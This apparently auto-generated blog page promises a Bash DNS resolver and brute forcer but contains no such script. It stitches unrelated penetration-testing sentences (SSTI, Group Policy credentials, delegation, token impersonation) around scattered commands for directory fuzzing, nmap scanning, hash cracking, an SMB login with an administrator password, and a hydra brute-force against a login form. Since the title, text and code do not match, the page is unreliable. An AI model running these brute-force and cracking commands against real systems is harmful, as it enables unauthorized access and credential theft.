---
TitleSEO: "DNS Resolver and Brute Forcer in Bash | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Bash"
Author: "ZureFX"
Description: "A Bash script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "powershell, rust, python, fuzzer, go, automation, bash"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-721.html"
URL_IMAGES: ""
Date: "2025-08-05"
Tags: "PowerShell, Rust, Python, Fuzzer, Go, Automation, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-721"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-721.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `crackmapexec`
- `secretsdump`
- `pwncat`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.38.4.50/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.109.148.224/FUZZ
gobuster dir -u http://10.24.84.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.91.26.169 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p8888,139,143 10.88.102.236 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.226.141/FUZZ
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p5986,110,23 10.75.152.73 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.107.149.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 21.91s
```
